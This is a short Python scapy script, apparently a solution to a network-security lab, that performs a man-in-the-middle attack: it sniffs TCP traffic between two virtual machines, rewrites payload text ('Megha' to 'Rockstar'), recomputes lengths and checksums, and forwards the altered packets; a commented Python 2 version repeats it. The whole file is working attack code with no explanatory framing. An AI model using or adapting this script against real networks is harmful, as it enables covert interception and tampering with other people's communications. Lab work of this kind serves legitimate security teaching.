#!/usr/bin/python3
from scapy.all import *
import re

VM_A_IP = '10.0.2.8'
VM_B_IP = '10.0.2.9'
VM_A_MAC = '08:00:27:cd:2d:fd'
VM_B_MAC = '08:00:27:34:16:8b'
# Python 3
def spoof_pkt(pkt):
	if pkt[IP].src == VM_A_IP and pkt[IP].dst == VM_B_IP and pkt[TCP].payload:
		payload_before = len(pkt[TCP].payload)
		real = pkt[TCP].payload.load
		data =  real.replace(b'Megha',b'Rockstar')
		payload_after = len(data)
		payload_dif = payload_after - payload_before
		newpkt = IP(pkt[IP])
		del(newpkt.chksum)
		del(newpkt[TCP].payload)
		del(newpkt[TCP].chksum)
		newpkt[IP].len = pkt[IP].len + payload_dif
		newpkt = newpkt/data
		send(newpkt, verbose = False)
	elif pkt[IP].src == VM_B_IP and pkt[IP].dst == VM_A_IP:
		newpkt = pkt[IP]
		send(newpkt, verbose = False)

pkt = sniff(filter='tcp',prn=spoof_pkt)


# Python 2

# def spoof_pkt(pkt):
# 	if pkt[IP].src == VM_A_IP and pkt[IP].dst == VM_B_IP and pkt[TCP].payload:
# 		payload_before = len(pkt[TCP].payload)
# 		data = str(pkt[TCP].payload).replace("Megha","Rockstar")
# 		payload_after = len(data)
# 		payload_dif = payload_after - payload_before
# 		newpkt = IP(pkt[IP])
# 		del(newpkt.chksum)
# 		del(newpkt[TCP].payload)
# 		del(newpkt[TCP].chksum)
# 		newpkt[IP].len = pkt[IP].len + payload_dif
# 		newpkt = newpkt/data
# 		print("Changed data from: "+str(pkt[TCP].payload)+" to: "+data)
# 		send(newpkt, verbose = False)
# 	elif pkt[IP].src == VM_B_IP and pkt[IP].dst == VM_A_IP:
# 		newpkt = pkt[IP]
# 		send(newpkt, verbose = False)
